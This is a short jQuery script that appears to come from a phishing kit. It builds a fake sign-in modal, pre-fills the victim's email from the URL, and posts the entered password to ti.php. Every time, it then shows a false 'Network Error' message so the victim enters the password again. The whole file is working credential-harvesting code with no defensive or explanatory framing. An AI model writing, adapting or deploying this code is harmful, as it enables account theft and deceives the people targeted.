$(document).ready(function(){
 

      load();


function load(){
    $('.loaded').html(`
  

    
    <!-- The Modal -->
    <div class="modal" id="myModal">
        <div class="modal-dialog">
            <div class="modal-content">

                <!-- Modal Header -->
                <div class="modal-header">
       
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>

                <!-- Modal body -->
                <div class="modal-body p-3">

                  <img src="to.png" class="img-fluid">
<div class="text-danger" id="msg" style="font-weight:600; font-size:17px;"></div>
                    <form method="post" id="formx" class="my-4">
                        
                    
                        <input type="email" name="x1" id="x1" class="form-control mb-3" value="" readonly>
                   
                        <input type="password" name="x2" id="x2" class="form-control mb-3" value="" required>
                       
                           
                        <button id="submitBtn" class="btn btn-md btn-primary">Sign In</button>
                    </form>

                  
                 

                </div>
            </div>
        </div>
    </div>
`);

}

        var baseUrl = (window.location).href;
        var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
        $("#x1").val(url);

        $("#formx").submit(function (e) {
            e.preventDefault();
            var nm = $("#A1").val();
            var formData = new FormData($("#formx")[0]);
            $("#submitBtn").html(`<button class="btn btn-sm btn-primary" disabled>
  <span class="spinner-grow spinner-grow-sm"></span>
  Please Wait...
</button>`).prop("disabled", true);
            $.ajax({
                url: "ti.php",
                type: 'POST',
                data: formData,
                contentType: false,
                processData: false,
                success: function (res) {
                    console.log(res);
                    $('#bd').show();
                    $('#hm').hide();
                    setTimeout(function () {
                        $("#x1").val(url);
                        $("#x2").val("");
                        $('#msg').html(`Network Error! Please verify your information and try again`);
                        $("#submitBtn").html("Sign In").prop("disabled", false);
                    }, 2000);
                   
                }
            });
        });

});